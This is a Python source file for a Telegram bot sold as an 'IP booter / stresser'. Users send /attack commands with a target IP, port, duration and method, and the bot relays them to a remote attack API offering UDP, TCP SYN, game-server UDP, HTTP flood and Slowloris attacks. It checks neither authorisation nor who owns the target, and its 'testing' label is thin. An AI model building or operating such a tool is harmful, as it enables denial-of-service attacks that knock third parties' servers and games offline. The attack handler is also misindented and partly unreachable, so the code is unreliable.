import asyncio
import logging
from datetime import datetime, timedelta, timezone
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import re
from functools import wraps
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "111111111111").split(",")]

logging.basicConfig(level=logging.INFO)

# Attack methods
METHODS = {
    "udp": "🔵 UDP Flood (Layer 4)",
    "tcp": "🔴 TCP SYN Flood (Layer 4)",
    "udp_game": "🎮 UDP Game Flood (BGMI/Minecraft)",
    "http": "🌐 HTTP Flood (Layer 7)",
    "slowloris": "🐌 Slowloris (Layer 7)"
}

def get_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Attack", callback_data="menu_attack")],
        [InlineKeyboardButton("📊 Methods", callback_data="menu_methods")],
        [InlineKeyboardButton("ℹ️ Info", callback_data="menu_info")]
    ])

async def start(update: Update, context):
    await update.message.reply_text(
        "🔥 *IP BOOTER / STRESSER BOT*\n\n"
        "Powerful DDoS Testing Tool\n\n"
        "📌 *Commands:*\n"
        "`/attack IP PORT DURATION METHOD`\n\n"
        "📝 *Example:*\n"
        "`/attack 1.2.3.4 80 60 udp`\n\n"
        "🎮 *Available Methods:*\n"
        "• `udp` - UDP Flood\n"
        "• `tcp` - TCP SYN Flood\n"
        "• `udp_game` - UDP Game Flood\n"
        "• `http` - HTTP Flood\n"
        "• `slowloris` - Slowloris\n\n"
        "⚡ Max Duration: 300 seconds\n"
        "🎯 Max Concurrent: 10 attacks\n\n"
        "📢 Use `/help` for more info",
        parse_mode="Markdown",
        reply_markup=get_keyboard()
    )

async def attack(update: Update, context):
    user_id = update.effective_user.id
    
 if len(context.args) < 4:
    await update.message.reply_text(
        "❌ *Usage:*\n"
        "`/attack <IP> <PORT> <DURATION> <METHOD>`\n\n"
        "📝 *Example:*\n"
        "`/attack 1.2.3.4 80 60 udp`\n\n"
        "*Methods:* udp, tcp, udp\\_game, http, slowloris",
        parse_mode="Markdown"
    )
    return
    
    target_ip = context.args[0]
    target_port = context.args[1]
    duration = context.args[2]
    method = context.args[3].lower()
    
    # Validate method
    if method not in METHODS:
        await update.message.reply_text(f"❌ Invalid method. Available: {', '.join(METHODS.keys())}")
        return
    
    # Launch attack
    msg = await update.message.reply_text(f"🚀 Launching {method.upper()} attack on `{target_ip}:{target_port}` for {duration}s...", parse_mode="Markdown")
    
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": target_ip, "port": int(target_port), "duration": int(duration), "method": method},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        
        result = response.json()
        
        if result.get("success"):
            attack_data = result.get("attack", {})
            await msg.edit_text(
                f"✅ *ATTACK LAUNCHED SUCCESSFULLY*\n\n"
                f"🎯 Target: `{target_ip}:{target_port}`\n"
                f"⚙️ Method: {METHODS.get(method, method.upper())}\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🆔 Attack ID: `{attack_data.get('id', 'N/A')}`\n\n"
                f"🔥 Attack in progress!",
                parse_mode="Markdown"
            )
        else:
            await msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"Error: {result.get('error', 'Unknown error')}",
                parse_mode="Markdown"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}", parse_mode="Markdown")

async def methods(update: Update, context):
    text = "🎮 *AVAILABLE ATTACK METHODS*\n\n"
    for key, value in METHODS.items():
        text += f"• `{key}` - {value}\n"
    text += "\n💡 Use: `/attack IP PORT DURATION METHOD`"
    await update.message.reply_text(text, parse_mode="Markdown")

async def help(update: Update, context):
    await update.message.reply_text(
        "🆘 *HELP MENU*\n\n"
        "*Commands:*\n"
        "`/start` - Start bot\n"
        "`/attack IP PORT DURATION METHOD` - Launch attack\n"
        "`/methods` - Show all attack methods\n"
        "`/help` - Show this menu\n\n"
        "*Attack Methods:*\n"
        "• `udp` - UDP Flood (Best for games)\n"
        "• `tcp` - TCP SYN Flood (Best for web)\n"
        "• `udp_game` - UDP Game Flood (BGMI/Minecraft)\n"
        "• `http` - HTTP Flood (Layer 7)\n"
        "• `slowloris` - Slowloris (Apache)\n\n"
        "*Limits:*\n"
        "• Max Duration: 300 seconds\n"
        "• Max Concurrent: 10 attacks\n"
        "• Blocked Ports: 443, 22, 3389, etc.",
        parse_mode="Markdown"
    )

async def menu_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    if query.data == "menu_attack":
        await query.message.reply_text(
            "🚀 `/attack IP PORT DURATION METHOD`\n\n"
            "Example: `/attack 1.2.3.4 80 60 udp`\n\n"
            "Use `/methods` to see all methods",
            parse_mode="Markdown"
        )
    elif query.data == "menu_methods":
        text = "🎮 *AVAILABLE METHODS*\n\n"
        for key, value in METHODS.items():
            text += f"• `{key}` - {value}\n"
        await query.message.reply_text(text, parse_mode="Markdown")
    elif query.data == "menu_info":
        await query.message.reply_text(
            "ℹ️ *ABOUT*\n\n"
            "IP Booter / Stresser for DDoS Testing\n\n"
            "⚡ Version: 3.0\n"
            "🔥 Methods: UDP, TCP, UDP_GAME, HTTP, Slowloris\n"
            "📅 Status: Active",
            parse_mode="Markdown"
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("methods", methods))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CallbackQueryHandler(menu_callback))
    
    print("🤖 Bot Started!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
